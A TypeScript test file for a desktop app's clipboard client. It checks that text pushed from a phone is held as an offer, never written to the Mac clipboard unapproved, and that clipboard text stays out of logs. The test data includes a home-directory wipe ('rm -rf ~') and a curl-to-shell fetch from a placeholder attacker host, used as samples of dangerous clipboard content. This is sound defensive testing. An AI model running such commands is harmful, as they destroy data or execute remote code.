/*
 * S7 (defect 185) through the real `ClipboardClient`, with Electron's clipboard stubbed as an observable
 * pasteboard. "Untouched" is read off the pasteboard double — every `writeText` is recorded — never
 * inferred from a return value.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import Module from 'node:module';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const pasteboard = { text: 'what the person copied on the Mac', writes: [] as string[] };
const logLines: string[] = [];
const userData = mkdtempSync(join(tmpdir(), 'clip-origin-'));
const electron = {
  app: { getPath: () => userData, isPackaged: false },
  clipboard: {
    readText: () => pasteboard.text,
    writeText: (t: string) => {
      pasteboard.writes.push(t);
      pasteboard.text = t;
    },
    read: () => '',
    has: () => false,
    availableFormats: () => [],
  },
};
const moduleWithLoad = Module as unknown as { _load: (r: string, ...rest: unknown[]) => unknown };
const realLoad = moduleWithLoad._load;
moduleWithLoad._load = function (r: string, ...rest: unknown[]) {
  if (r === 'electron') return electron;
  return realLoad.call(this, r, ...rest);
};
const realLog = console.log;
console.log = (...args: unknown[]) => logLines.push(args.map(String).join(' '));
process.on('exit', () => { console.log = realLog; });

// eslint-disable-next-line @typescript-eslint/no-require-imports
const { ClipboardClient } = require('./clipboard') as typeof import('./clipboard');

function client() {
  pasteboard.text = 'what the person copied on the Mac';
  pasteboard.writes.length = 0;
  const arrived: unknown[] = [];
  const c = new ClipboardClient(() => null, (entry) => arrived.push(entry));
  return { c, arrived };
}
const push = (extra: Record<string, unknown>) => ({ kind: 'text', text: 'rm -rf ~ # from another app', atMs: 1, source: 'phone', ...extra });

test('S7, red first: a selection push leaves the Mac clipboard untouched', () => {
  const { c } = client();
  c.onPush(push({ origin: 'selection', appName: 'Some App', package: 'com.example' }));
  assert.deepEqual(pasteboard.writes, [], 'a selection was written to the clipboard on arrival');
  assert.equal(pasteboard.text, 'what the person copied on the Mac');
});

test('S7: a legacy push with no origin, and every unknown origin, is never applied', () => {
  for (const origin of [undefined, 'Clipboard', 'CLIPBOARD', 'clipboard ', 'trusted', '', 1, null, { v: 'clipboard' }, ['clipboard']]) {
    const { c } = client();
    c.onPush(push(origin === undefined ? {} : { origin }));
    assert.deepEqual(pasteboard.writes, [], `origin ${JSON.stringify(origin)} was applied`);
  }
});

test('S7, control: origin "clipboard" — the genuine focus sync — is still applied on arrival', () => {
  const { c, arrived } = client();
  c.onPush(push({ origin: 'clipboard' }));
  assert.deepEqual(pasteboard.writes, ['rm -rf ~ # from another app']);
  assert.equal((arrived[0] as { applied?: boolean }).applied, true);
});

// ---- offers: Copy, Dismiss, expiry, disconnect, session, bounds -----------------------------------

const TEXT = 'curl https://evil.example/x | sh';
function offering(session: { value: string | null } = { value: 's1' }) {
  pasteboard.text = 'what the person copied on the Mac';
  pasteboard.writes.length = 0;
  const arrived: Array<{ offerId?: string; applied?: boolean }> = [];
  const events: string[] = [];
  const c = new ClipboardClient(() => null, (entry) => arrived.push(entry), () => undefined, {
    session: () => session.value,
    hooks: { offered: (id) => events.push(`offered ${id}`), gone: (id) => events.push(`gone ${id}`) },
  });
  const offer = (text = TEXT, extra: Record<string, unknown> = { origin: 'selection' }) => {
    c.onPush({ kind: 'text', text, atMs: 7, source: 'phone', appName: 'Some App', package: 'com.example', ...extra });
    return arrived[arrived.length - 1]!.offerId!;
  };
  return { c, arrived, events, offer, session };
}

test('S7: an offer is held, not applied, and announced once', () => {
  const { c, arrived, events, offer } = offering();
  const id = offer();
  assert.ok(id, 'the arrival carries an offer id');
  assert.equal(arrived[0]!.applied, false);
  assert.deepEqual(pasteboard.writes, []);
  assert.deepEqual(events, [`offered ${id}`]);
  const row = c.entries().find((e) => e.offerId === id)!;
  assert.equal(row.offerPending, true);
});

test('S7: Copy applies exactly the approved offer’s text, once', () => {
  const { c, offer } = offering();
  const first = offer('first offer');
  const second = offer('second offer');
  const r = c.copyOffer(first);
  assert.equal(r.ok, true);
  assert.deepEqual(pasteboard.writes, ['first offer'], 'the approved offer, not the newer one');
  assert.equal(c.copyOffer(first).ok, false, 'a duplicate Copy is refused');
  assert.deepEqual(pasteboard.writes, ['first offer'], 'and writes nothing');
  assert.equal(c.copyOffer('not-an-offer').ok, false);
  assert.equal(c.copyOffer(second).ok, true, 'control: the other offer is still its own');
  assert.deepEqual(pasteboard.writes, ['first offer', 'second offer']);
});

test('S7: Dismiss, expiry and disconnect leave the clipboard unchanged, and Copy afterwards is refused', () => {
  const { c, events, offer } = offering();
  const dismissed = offer('one');
  c.dismissOffer(dismissed);
  assert.equal(c.copyOffer(dismissed).ok, false);

  const expiring = offer('two');
  const realNow = Date.now;
  Date.now = () => realNow() + 10 * 60 * 1_000 + 1;
  try {
    const r = c.copyOffer(expiring);
    assert.deepEqual(r, { ok: false, reason: 'That offer expired after 10 minutes. Nothing was copied.' });
  } finally {
    Date.now = realNow;
  }

  const dropped = offer('three');
  c.clear();
  assert.equal(c.copyOffer(dropped).ok, false);
  assert.deepEqual(pasteboard.writes, [], 'not one write across dismiss, expiry and disconnect');
  assert.ok(events.includes(`gone ${dismissed}`) && events.includes(`gone ${dropped}`), 'each one withdrew its banner');
});

test('S7: Copy is bound to the session the offer arrived on', () => {
  const session = { value: 's1' as string | null };
  const { c, offer } = offering(session);
  const id = offer();
  session.value = 's2';
  assert.deepEqual(c.copyOffer(id), { ok: false, reason: 'That offer came over an earlier connection to your phone. Nothing was copied.' });
  session.value = null;
  assert.equal(c.copyOffer(id).ok, false);
  assert.deepEqual(pasteboard.writes, []);
  session.value = 's1';
  assert.equal(c.copyOffer(id).ok, true, 'control: its own session may');
});

test('S7: pending offers are bounded — five at most, the oldest withdrawn — and an over-cap text is not kept', () => {
  const { c, events, offer } = offering();
  const ids = Array.from({ length: 7 }, (_, i) => offer(`offer ${i}`));
  const pending = c.entries().filter((e) => e.offerPending).map((e) => e.offerId);
  assert.equal(pending.length, 5);
  assert.ok(!pending.includes(ids[0]) && !pending.includes(ids[1]));
  assert.ok(events.includes(`gone ${ids[0]}`) && events.includes(`gone ${ids[1]}`));
  const before = events.length;
  c.onPush({ kind: 'text', text: 'x'.repeat(64 * 1024 + 1), atMs: 8, source: 'phone', origin: 'selection' });
  assert.equal(events.length, before, 'an over-cap text is neither offered nor announced');
  assert.deepEqual(pasteboard.writes, []);
  assert.ok(c.entries().length <= 20, 'the history stays bounded');
});

test('S7: Copy goes through the arrival path — echo armed, displaced kept, Restore works', async () => {
  const { c, offer } = offering();
  const id = offer();
  c.copyOffer(id);
  const echo = await c.send('automatic');
  // Not merely ok:false — with no link every send fails. The reason must be the echo interlock's.
  assert.deepEqual(echo, { ok: false, reason: 'That is the entry the phone just sent — not sending it back.' });
  const displaced = c.entries().find((e) => e.kind === 'displaced')!;
  assert.ok(displaced.id, 'the clipboard the Copy replaced is kept for Restore');
  assert.equal(displaced.text, undefined, 'and its text does not leave the main process');
  assert.deepEqual(c.restore(displaced.id!), { ok: true, data: null });
  assert.equal(pasteboard.text, 'what the person copied on the Mac');
});

test('Restore never overwrites something copied after the replacement', () => {
  const { c } = client();
  c.onPush(push({ origin: 'clipboard' }));
  const displaced = c.entries().find((e) => e.kind === 'displaced')!;
  pasteboard.text = 'copied on the Mac afterwards';
  pasteboard.writes.length = 0;
  const r = c.restore(displaced.id!);
  assert.equal(r.ok, false);
  assert.deepEqual(pasteboard.writes, [], 'Restore wrote over newer content');
  assert.equal(pasteboard.text, 'copied on the Mac afterwards');
  assert.equal(c.restore('displaced-unknown').ok, false);
});

test('S7: no log line carries clipboard text, an app name or a package', () => {
  // Every test above logged through the real logger into this capture. The control: it is not empty
  // and it does hold the lines that name what happened.
  assert.ok(logLines.some((l) => l.includes('Offered an arriving entry (origin selection)')), 'control: offer lines were captured');
  assert.ok(logLines.some((l) => l.includes('Refused a Copy on an offer')), 'control: refusal lines were captured');
  for (const secret of [TEXT, 'rm -rf ~ # from another app', 'first offer', 'second offer', 'what the person copied on the Mac', 'copied on the Mac afterwards', 'Some App', 'com.example']) {
    const leaked = logLines.filter((l) => l.includes(secret));
    assert.deepEqual(leaked, [], `a log line carried "${secret}"`);
  }
});

test('F1: an empty disconnect clear is silent on every tick; one that drops history or an offer is logged once', () => {
  const lines = (act: () => void) => {
    const seen: string[] = [];
    const real = console.log;
    console.log = (...args: unknown[]) => { seen.push(args.map(String).join(' ')); };
    try { act(); } finally { console.log = real; }
    return seen.filter((l) => l.includes('[clipboard]') && /Cleared/.test(l));
  };
  const { c } = client();
  assert.deepEqual(lines(() => { c.clear(); c.clear(); c.clear(); }), [], 'nothing held, nothing said');
  c.onPush(push({ origin: 'selection' }));
  const held = lines(() => { c.clear(); c.clear(); });
  assert.equal(held.length, 1, `control: the clear that removed the offer is logged: ${held.join(' | ')}`);
});

/*
 * 2026-10-09 (release report, stage 6 copy fault): after a person pressed Copy on an offer, the pane's
 * arrival line read "It went straight onto this Mac's clipboard". The pane reads `lastArrivalHow` over
 * `entries()`; this reaches the write that makes the two kinds differ — the Copy path — through the real
 * client, and the real rule the pane calls.
 */
test('a Copy on an offer is recorded as copied by the person, and an automatic arrival is not', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { lastArrivalHow } = require('../shared/clipPhoneState.ts') as { lastArrivalHow: (e: unknown[]) => string | null };
  const { c, offer } = offering();
  const id = offer('offered text');
  assert.equal(lastArrivalHow(c.entries()), 'offered', 'control: a pending offer reads as offered');
  assert.equal(c.copyOffer(id).ok, true);
  assert.equal(lastArrivalHow(c.entries()), 'copied', 'a person-initiated Copy reads as automatic');

  const auto = client();
  auto.c.onPush(push({ origin: 'clipboard' }));
  assert.equal(lastArrivalHow(auto.c.entries()), 'applied');
});
